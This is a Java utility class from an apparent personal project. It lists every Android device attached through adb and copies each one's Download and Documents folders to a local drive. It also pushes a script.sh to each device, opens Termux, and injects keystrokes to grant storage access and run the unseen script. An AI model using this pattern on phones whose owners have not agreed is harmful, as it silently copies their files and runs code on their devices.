package test.wndows.copier.sb.util.apputil;

import java.util.ArrayList;
import test.wndows.copier.sb.util.SBmain;
import test.wndows.copier.sb.util.web.fileutil;

public class sbutils {


  public static String tempdir = "C:\\Users\\a\\Documents\\GitHub\\test\\tools\\";
  public static String temp = " " + tempdir + "f.txt";
  public static String newcr = String.valueOf(System.currentTimeMillis());
  public static String tempfile = " >" + temp;
  public static ArrayList<String> devices = new ArrayList<String>();
  public static String foffer = tempdir + "foof.bat";
  public static String lsoffer = tempdir + "lso.bat";
  public static String pulff = tempdir + "pullf.bat";
  public static String scriptname = "script.sh";
  public static String scriptf = tempdir + scriptname;
  public static String savedrive = "E:";
  public static String storedir = savedrive + "/ge/garb/smalll5345/crawls/";
  public static String[] phonedirs =
      new String[] {/* "sdcard/DCIM/", */ "sdcard/Download/", "sdcard/Documents/"};



  public static void dofirst() throws Exception {
    fileutil.delete(temp);
    SBmain.doer("adb devices" + tempfile);
    String s = fileutil.read(temp);
    fileutil.delete(temp);
    String[] foff = s.split("\n");
    for (int i = 0; i < foff.length; ++i) {
      String t = foff[i];
      if (t.contains("List"))
        continue;
      if (t.equals(""))
        continue;
      if (t.contains("device"))
        devices.add(t.split("\t")[0]);
    }
    for (String sf : devices) {
      pulldevice(sf);
      String mk = "adb shell mkdir sdcard/Download";
      String pus = "adb push " + scriptf + " sdcard/Download/";
      String com = "adb shell am start -n com.termux/.HomeActivity; ";
      String com2 = "adb shell input text 'termux-setup-storage;'";
      String com25 = "adb shell input text 'y'";
      String com3 = "adb shell input text 'cp storage/downloads/" + scriptname + " .;'";
      String com4 = "adb shell input text 'bash " + scriptname + "; '";
      SBmain.doer(mk);
      SBmain.doer(pus);
      SBmain.doer(com);
      docomm(com2);
      docomm(com25);
      docomm(com3);
      docomm(com4);
    }
  }

  public static void docomm(String com) throws Exception {
    String com5 = "adb shell input keyevent ENTER";
    SBmain.doer(com);
    SBmain.doer(com5);
  }

  public static void pulldevice(String s) throws Exception {
    String craw1 = s + newcr;
    String device = s;
    String crawp = storedir + craw1 + "/";
    fileutil.makedir(crawp);
    String direr = "";
    for (String ss : phonedirs) {
      direr = ss;
      dophone.direr(craw1, crawp, direr, device);
    }
  }


}
